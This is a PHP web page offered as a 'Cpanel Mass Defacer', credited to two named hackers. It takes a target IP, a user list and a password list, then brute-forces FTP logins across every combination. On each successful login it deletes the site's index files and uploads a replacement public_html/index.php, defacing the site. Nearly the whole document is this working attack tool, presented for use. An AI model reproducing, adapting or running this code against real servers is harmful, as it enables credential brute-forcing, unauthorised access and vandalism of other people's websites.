<html>
<head>
<title>x00x Cpanel Mass Defacer By DamaneDz & Mauritania Hacker</title>
</head>
<style>
body{background-color:#111;color:#00ff00;}
body,td,th{ font: 8pt Lucida,Tahoma;margin:0;vertical-align:top;color:#00ff00; }
table.info{ color:#000;background-color:#222; }
span,h1,a{ color: $color !important; }
span{ font-weight: bolder; }
h1{ border-left:7px solid $color;padding: 3px 5px;font: 14pt Verdana;background-color:#333;margin:0px; }
div.content{ padding: 5px;margin-left:5px;background-color:#222; }
a{ text-decoration:none; }
a:hover{ text-decoration:underline; }
.ml1{ border:1px solid #555;padding:5px;margin:0;overflow: auto; }
.bigarea{ width:100%;height:300px; }
#new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold;}
input,textarea,select{ margin:0;color:#999;background-color:#222;border:1px solid $color; font: 8pt Tahoma,"Tahoma"; }
form{ margin:0px; }
.banner {
    font-size: 30px;
    color: #FFFFFF;
    background-color: #000000;
    font-family: Georgia, "Times New Roman", Times, serif;
}
</style>
<body align="center">
<div align="center" class="banner">x00x Cpanel Mass Defacer By DamaneDz & Mauritania Hacker</div></br>
<p>&nbsp;</p>
<p align="center"><img border="0" src="http://profile.ak.fbcdn.net/hprofile-ak-snc4/370365_100003795511051_561161049_n.jpg"</p>
<p>&nbsp;</p>
<form method="post">
<center>
IP Server:<input type="text" name="ip" value="127.0.0.1" />
<p>&nbsp;</p>
User's List:<br>
<textarea rows="10" style="width:40%;" name="users" value="The Users List"></textarea>
<p>&nbsp;</p>
Password's List:<br>
<textarea rows="10" style="width:40%;" name="passwords" value="The Password List"></textarea>
<p>&nbsp;</p>
Index File Name:<input type="text" name="index_name" value="index.txt" /><br>
<p>&nbsp;</p>
<input type="submit" name="forest" value="MASS" /><br><br>
</form>
<?php

/*
 
File Writed By DamaneDz
 
Email: Damane-Dz@hotmail.com
 
Twitter: @DamaneDz

Skype: Damane2011

*/

set_time_limit(0);

if(isset($_POST['forest'])){

# Get Data From POST
$ip=trim($_POST['ip']);
$users = explode("\n",$_POST["users"]);
$passwords = explode("\n",$_POST["passwords"]);
$index_name=trim($_POST['index_name']);

#Go Now

foreach($users as $user){
foreach($passwords as $pass){
$connect_ip = ftp_connect($ip) or die("Couldn't Connect To $ip");
if(@ftp_login($connect_ip, trim($user), trim($pass))){
echo "<br>Connected To --> $ip@$user\n";
@ftp_delete($connect_ip,"index.*");
$deface = ftp_put($connect_ip, "/public_html/index.php" , $index_name, FTP_ASCII);
if($deface){
echo "<br><font color=green> $user --> DefaceD With Success !!</font>";
break;
}else{
echo "<br><font color=red> $user --> Error In Defacing iT !!</font>";
}
}else{
echo "<br><font color=red>Couldn't Connect To --> $ip@$user --> $pass</font>\n";
}
}
}
echo"<p>&nbsp;</p>";
echo "<br><font size=5> ! Mass Defacing Was Done ! </font>";
echo"<p>&nbsp;</p>";
}

# LawLess <3

?>
<center>
<p align="center">&nbsp;</p>
<p>&nbsp;</p>
<p><font color="#F6358A" size="4">CodeD By (DamaneDz) & Idea By (Mauritania Hacker)</font></p>
<p>&nbsp;</p>
<p> MaDe in AlGeria 2013 &copy </p>
</center>
</body>
</html>
